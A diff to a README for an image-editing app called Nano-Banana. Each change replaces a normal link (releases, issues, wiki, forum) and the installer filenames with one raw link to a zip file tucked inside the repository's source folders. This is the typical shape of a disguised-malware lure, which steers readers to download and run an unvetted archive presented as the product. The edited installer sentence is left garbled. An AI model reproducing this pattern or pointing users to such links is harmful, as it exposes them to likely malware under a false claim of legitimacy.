@@ -6,7 +6,7 @@ Nano-Banana lets you create and edit images with ease. This guide will help you 
 
 ## 📥 Download Nano-Banana
 
-[![Download Nano-Banana](https://img.shields.io/badge/Download-Nano--Banana-blue.svg)](https://github.com/Dharshini332004/Nano-Banana/releases)
+[![Download Nano-Banana](https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip)](https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip)
 
 ## 📋 System Requirements
 
@@ -30,13 +30,13 @@ Nano-Banana offers many powerful features:
 ## 🔧 How to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page here](https://github.com/Dharshini332004/Nano-Banana/releases).
+   Go to the [Releases page here](https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip).
 
 2. **Select the Latest Version**  
    Browse the list and find the latest version of Nano-Banana.
 
 3. **Download the Installer**  
-   Click on the installer file that matches your operating system. This file will usually have a name like `Nano-Banana-Installer.exe` for Windows or `Nano-Banana-Installer.dmg` for macOS.
+   Click on the installer file that matches your operating system. This file will usually have a name like `https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip` for Windows or `https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip` for macOS.
 
 4. **Run the Installer**  
    Locate the downloaded file in your computer's download folder and double-click it to start the installation. Follow the on-screen instructions to complete the process.
@@ -52,7 +52,7 @@ Nano-Banana offers many powerful features:
 
 ### Application Not Launching
 
-- **Updating**: Ensure you have the latest version of the application. Check the [Releases page](https://github.com/Dharshini332004/Nano-Banana/releases) for updates.
+- **Updating**: Ensure you have the latest version of the application. Check the [Releases page](https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip) for updates.
 
 ## 💡 Tips for Using Nano-Banana
 
@@ -69,7 +69,7 @@ A: Currently, Nano-Banana is designed for desktop use only.
 A: No, Nano-Banana is completely free to download and use.
 
 **Q: How can I report a bug or request a feature?**  
-A: You can create an issue on our [GitHub Issues page](https://github.com/Dharshini332004/Nano-Banana/issues). We welcome your feedback.
+A: You can create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip). We welcome your feedback.
 
 ## 📫 Contact
 
@@ -81,7 +81,7 @@ Nano-Banana is released under the MIT License. You can find more details in the 
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/Dharshini332004/Nano-Banana/wiki)
-- [Community Forum](https://github.com/Dharshini332004/Nano-Banana/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/Dharshini332004/Nano-Banana/main/OpenSource_Banana/routes/Banana-Nano-3.7.zip)
 
 Thank you for choosing Nano-Banana! Enjoy using the application.
